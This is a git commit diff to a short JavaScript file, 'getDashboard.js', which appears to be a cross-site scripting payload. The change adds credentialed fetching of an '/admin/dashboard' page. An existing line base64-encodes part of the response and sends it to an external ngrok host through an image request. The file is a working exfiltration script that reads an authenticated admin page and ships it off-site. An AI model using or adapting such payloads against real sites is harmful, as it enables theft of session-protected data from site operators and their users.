073985a63ac7433b0b98c0e52cef26eaf4796481
glno815 <78334532+glno815@users.noreply.github.com>
2026-03-17 21:55:16 +0700

    Update getDashboard.js

--- getDashboard.js
+++ getDashboard.js
@@ -1,4 +1,4 @@
-fetch("/admin/dashboard")
+fetch("/admin/dashboard",{credentials:'include'})
 .then(r=>r.text())
 .then(d=>{
 new Image().src="https://b5be-2402-800-61c7-539d-6be1-5c24-9cd9-8309.ngrok-free.app?p=1&d="+btoa(d.slice(6000,10000))
